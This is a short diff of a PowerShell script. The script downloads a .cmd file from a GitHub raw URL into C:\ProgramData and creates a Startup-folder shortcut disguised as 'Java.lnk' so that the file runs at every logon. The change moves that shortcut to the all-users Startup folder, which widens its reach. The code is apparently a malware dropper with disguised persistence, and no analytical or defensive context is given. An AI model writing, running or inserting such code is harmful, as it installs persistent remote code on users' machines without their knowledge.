@@ -5,7 +5,7 @@ $url = 'https://github.com/qwertyuiopindia/test/raw/main/AW_prod.cmd?raw=true'
 $file = "C:\ProgramData\AW_prod.cmd"
 $down.DownloadFile($url,$file)
 $objShell = New-Object -ComObject ("WScript.Shell")
-$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\Start Menu\Programs\Startup" + "\java.lnk")
+$objShortCut = $objShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" + "\Java.lnk")
 $objShortCut.TargetPath="C:\ProgramData\AW_prod.cmd"
 $objShortCut.Save()
 $down = New-Object System.Net.WebClient
